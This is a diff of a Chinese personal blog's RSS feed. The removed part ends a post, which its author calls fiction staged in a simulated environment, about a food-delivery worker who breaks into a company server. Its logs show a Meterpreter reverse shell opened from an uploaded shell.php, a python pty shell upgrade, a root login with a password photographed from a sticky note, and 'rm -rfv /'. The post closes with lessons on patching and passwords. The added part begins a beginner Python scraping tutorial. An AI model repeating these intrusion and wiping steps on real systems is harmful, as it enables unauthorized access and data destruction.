-&lt;/div&gt;&lt;p&gt;这时他将提示出的文件地址和链接改一下，并访问&lt;/p&gt;
-&lt;blockquote&gt;
-&lt;p&gt;&lt;code&gt;http://192.168.0.116/upload/shell.php&lt;/code&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;msf 立刻就有了结果，可想而知，服务器的安全措施有多差&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[*] Started reverse TCP handler on 192.168.0.109:4444 
-[*] Sending stage (38288 bytes) to 192.168.0.116
-[*] Meterpreter session 1 opened (192.168.0.109:4444 -&amp;gt; 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800
-
-meterpreter &amp;gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;现在他开始获取系统简要信息&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;系统、内核版本&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;meterpreter &amp;gt; sysinfo
-Computer    : localhost
-OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
-Meterpreter : php/linux
-meterpreter &amp;gt; cat /etc/issue
-CentOS release 6.10 (Final)
-Kernel \r on an \m
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;ul&gt;
-&lt;li&gt;当前控制的用户权限&lt;/li&gt;
-&lt;/ul&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;meterpreter &amp;gt; getuid
-Server username: apache (48)
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。&lt;/p&gt;
-&lt;p&gt;由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。&lt;/p&gt;
-&lt;p&gt;看起来他需要想想其他办法。&lt;/p&gt;
-&lt;p&gt;他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。&lt;/p&gt;
-&lt;p&gt;一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。&lt;/p&gt;
-&lt;p&gt;上面写着一些数字和字母，也许是什么有用的东西。&lt;/p&gt;
-&lt;p&gt;趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。&lt;/p&gt;
-&lt;p&gt;比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。&lt;/p&gt;
-&lt;p&gt;下班后回到终端，尝试着用偷窥来的密码直接登陆 root&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;meterpreter &amp;gt; shell
-Process 1376 created.
-Channel 2 created.
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;获得交互 shell&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;/bin/sh -i
-sh: no job control in this shell
-sh-4.1$ python -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
-python -c &amp;#39;import pty;pty.spawn(&amp;#34;/bin/bash&amp;#34;)&amp;#39;
-bash-4.1$ 
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;进行登录&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;bash-4.1$ su root
-su root
-Password: ************
-
-[root@localhost upload]# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;可见，一口气便登录成功，root 权限到了他的手里。&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;6
-&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;7
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[root@localhost upload]# whoami
-whoami
-root
-[root@localhost upload]# id
-id
-uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
-[root@localhost upload]# 
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;接下来他便可以为所欲为了..&lt;/p&gt;
-&lt;p&gt;对，他最后进行了删库&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
-&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
-&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
-&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-txt&#34; data-lang=&#34;txt&#34;&gt;[root@localhost upload]# rm -rfv /
-&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
-&lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;最后导致公司损失巨大..&lt;/p&gt;
-&lt;h1 id=&#34;结语&#34;&gt;结语&lt;/h1&gt;
-&lt;p&gt;虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。&lt;/p&gt;
-&lt;p&gt;但却值得我们思考，就我们能看到的来看&amp;hellip;&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;系统不更新容易被攻击&lt;/li&gt;
-&lt;li&gt;代码不更新容易出漏洞&lt;/li&gt;
-&lt;li&gt;密码更新太慢容易泄露&lt;/li&gt;
-&lt;li&gt;漏洞以更新来修复，不修则被利用&lt;/li&gt;
-&lt;/ul&gt;
-&lt;p&gt;而我们看不到的&amp;hellip;&lt;/p&gt;
-&lt;p&gt;软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？&lt;/p&gt;
-&lt;p&gt;不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。&lt;/p&gt;
-&lt;p&gt;而不能站立不动甚至往回走。&lt;/p&gt;
-&lt;p&gt;物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。&lt;/p&gt;
-&lt;p&gt;甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..&lt;/p&gt;
-&lt;p&gt;以上，只是个人想法，若有不当之处，请在下面的 gitalk 评论插件中 &lt;del&gt;喷我&lt;/del&gt; 纠正。&lt;/p&gt;
-- https://weepingdogel.github.io/posts/2020-09-26/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
-        </item>
     
     
     
@@ -4356,6 +3986,185 @@ Table: users
 &lt;/li&gt;
 &lt;/ul&gt;
 - https://weepingdogel.github.io/posts/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8github%E6%90%AD%E5%BB%BA%E7%BD%91%E7%AB%99_%E4%B8%8A/ - 2019-2021 | WeepingDogel via CC-BY-NC 4.0</description>
+        </item>
+    
+    
+    
+        <item>
+        <title>Python学习笔记 简单爬虫</title>
+        <link>https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/</link>
+        <pubDate>Tue, 13 Aug 2019 22:20:53 +0800</pubDate>
+        
+        <guid>https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/</guid>
+        <description>WeepingDogel&#39;s Blog https://weepingdogel.github.io/posts/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E7%AE%80%E5%8D%95%E7%88%AC%E8%99%AB/ -&lt;h2 id=&#34;一如既往不正经的前言&#34;&gt;一如既往不正经的前言&lt;/h2&gt;
+&lt;p&gt;嘿嘿，我又回来了，今天在U盘里弄好了hexo，现在可以继续更新了&lt;/p&gt;
+&lt;p&gt;&lt;del&gt;并且这次博客添加了访问量统计，欢迎扩～&lt;/del&gt;&lt;/p&gt;
+&lt;p&gt;那么，本期更新一个简单的Python爬虫&lt;/p&gt;
+&lt;h2 id=&#34;爬虫原理&#34;&gt;爬虫原理&lt;/h2&gt;
+&lt;blockquote&gt;
+&lt;p&gt;小白: 大佬大佬～爬虫是啥啊？&lt;/p&gt;
+&lt;p&gt;大佬: 去搜索引擎查呀&lt;/p&gt;
+&lt;p&gt;小白: 查了，还是看不懂&lt;/p&gt;
+&lt;p&gt;大佬: emmmmm..那你继续往下看吧…&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;概述&#34;&gt;概述&lt;/h3&gt;
+&lt;p&gt;2333,爬虫其实很好理解&lt;/p&gt;
+&lt;p&gt;我们都知道上网是用浏览器的，那么我们具体是怎样访问一个网页的呢？看下面吧(懒得画图了)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;ol&gt;
+&lt;li&gt;
+&lt;p&gt;浏览器 –发送一个请求www.bing.com –&amp;gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;服务器 &amp;lt;–接受到请求-–&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;服务器 –做出响应–&amp;gt; –返回数据–&amp;gt; 浏览器&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ol&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;什么？还是不了解？那我们用浏览器来看一下吧，我们随便打开一个网页&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-08-13_01-05-37.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;以Chrome/Chromiun为例，接下来依次点击 &lt;code&gt;鼠标右键——检查——NetWork——将Preserve log打上勾 &lt;/code&gt;，然后刷新 就会发现出现了以下内容&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-08-13_01-12-19.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;我们可以看到浏览器很详细的把请求内容显示出来了，而左边那些列表，你已经获取了这个网站的内容。&lt;/p&gt;
+&lt;p&gt;爬虫的原理就是把这些过程自动化，不需要我们去手动访问，就可以把网页中你想要的信息和内容爬取下来。&lt;/p&gt;
+&lt;h3 id=&#34;爬虫的作用&#34;&gt;爬虫的作用&lt;/h3&gt;
+&lt;p&gt;举个例子，这里有一个 &lt;del&gt;&lt;a href=&#34;http://www.hiphop8.com/&#34;&gt;全国号码段(链接已失效)&lt;/a&gt;&lt;/del&gt; 的网站，我们需要取一个城市中其中一个号码段的所有的号码。比如西安市&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-08-13_01-18-42.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://weepingdogel.github.io/img/%E6%88%AA%E5%9B%BE_2019-08-13_01-20-17.png&#34; alt=&#34;&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，号码段有很多，每个段有一万个号码。这个时候怎么办呢？总不可能用鼠标一条一条的去复制粘贴吧？这个时候爬虫就派上用场了。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;其实也可以用来爬取我的博客，当更新的时候就可以及时收到更新信息&lt;/p&gt;
+&lt;p&gt;啊啊别打我，疼疼疼&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h2 id=&#34;编程语言的选择&#34;&gt;编程语言的选择&lt;/h2&gt;
+&lt;p&gt;我们如果要进行爬虫工作，那么就必须使用编程语言，用得最多的是&lt;strong&gt;Python&lt;/strong&gt;，因为Python进行爬虫是比较简便的，当然也可以选择其他的比如&lt;strong&gt;C/C++&lt;/strong&gt;、&lt;strong&gt;Java&lt;/strong&gt;等，甚至是&lt;strong&gt;易语言&lt;/strong&gt;都可以做到，只不过难易度和写法不同，目的和功能都是一样的。本期我们选择Python&lt;/p&gt;
+&lt;h2 id=&#34;python的安装&#34;&gt;Python的安装&lt;/h2&gt;
+&lt;p&gt;Python是跨平台的语言，所以平台不同安装方法也有所不同。&lt;/p&gt;
+&lt;h3 id=&#34;windows&#34;&gt;Windows&lt;/h3&gt;
+&lt;p&gt;可以到&lt;a href=&#34;https://www.python.org/&#34;&gt;Python的官网&lt;/a&gt;去下载安装程序并安装，建议下载Python3&lt;/p&gt;
+&lt;h3 id=&#34;mac-osx&#34;&gt;Mac OSX&lt;/h3&gt;
+&lt;p&gt;同样到&lt;a href=&#34;https://www.python.org/&#34;&gt;Python的官网&lt;/a&gt;下载&lt;/p&gt;
+&lt;h3 id=&#34;linux&#34;&gt;Linux&lt;/h3&gt;
+&lt;p&gt;Linux则在包管理器安装即可&lt;/p&gt;
+&lt;h4 id=&#34;deb系&#34;&gt;deb系&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo apt-get install python3
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;arch系&#34;&gt;Arch系&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo pacman -S python
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h4 id=&#34;rpm系&#34;&gt;rpm系&lt;/h4&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;$ sudo yum install python3
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;android&#34;&gt;Android&lt;/h3&gt;
+&lt;p&gt;Android平台则安装QPython即可，&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.coolapk.com/apk/com.hipipal.qpy3&#34;&gt;到酷安安装&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;https://www.qpython.com/&#34;&gt;QPython官网&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;安装pip&#34;&gt;安装pip&lt;/h2&gt;
+&lt;p&gt;Windows和Mac OSX的安装程序会自动装上pip，而Linux则不会，需要手动安装。&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;什么？你问我Android？我也不知道2333&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;首先打开&lt;a href=&#34;https://pypi.org/project/pip/#files&#34;&gt;这个网页&lt;/a&gt;，然后点击&lt;strong&gt;Download&lt;/strong&gt;，下载第二个tar.gz文件，这是个Linux压缩文件。&lt;/p&gt;
+&lt;p&gt;然后解压它，就会得到一个&lt;code&gt;pip-19.2.2目录&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
